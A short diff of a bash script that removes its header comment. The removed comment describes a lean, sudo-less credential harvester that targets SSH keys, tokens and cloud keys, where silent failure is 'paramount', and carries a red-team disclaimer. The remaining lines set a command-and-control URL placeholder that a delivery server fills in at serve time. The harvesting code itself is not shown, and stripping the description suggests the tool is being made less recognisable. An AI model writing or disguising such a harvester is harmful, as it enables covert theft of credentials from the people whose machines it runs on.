@@ -1,14 +1,4 @@
 #!/usr/bin/env bash
-# =============================================================================
-# Bash Credential Harvester — Lean: SSH + Tokens + Cloud Keys only
-# Optimized for speed: no browser DB extraction, no process memory walking,
-# no shell history, no persistence/backdoor logic.
-# FULLY SUDO-LESS
-# =============================================================================
-# WARNING: For authorized red team / pentest engagement use only.
-# =============================================================================
-
-# NO set -e / set -u — silent failure is paramount
 
 # ── Configuration ─────────────────────────────────────────────────────────────
 C2_URL="C2_URL_PLACEHOLDER"                                # replaced at serve time by delivery server
